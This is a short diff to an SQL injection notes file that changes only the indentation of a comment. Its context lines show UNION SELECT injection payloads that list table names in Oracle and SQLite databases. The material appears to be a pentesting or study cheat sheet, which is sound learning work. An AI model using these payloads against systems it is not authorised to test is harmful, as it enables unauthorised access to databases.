@@ -25,7 +25,7 @@ z## SQLI-Query-Notes
 ● Oracle                        : ' UNION SELECT table_name FROM all_tables-- (if column count more than one put NULL after table_name)
 ● SQLite                        : ' UNION SELECT name FROM sqlite_schema WHERE type = 'table'--
                                   ' UNION SELECT name FROM sqlite_schema WHERE type = 'table' AND name NOT LIKE 'sqlite_%'--
-                                  (it filters out SQLite's internal metadata tables)
+                                    (it filters out SQLite's internal metadata tables)
 ```
 
 
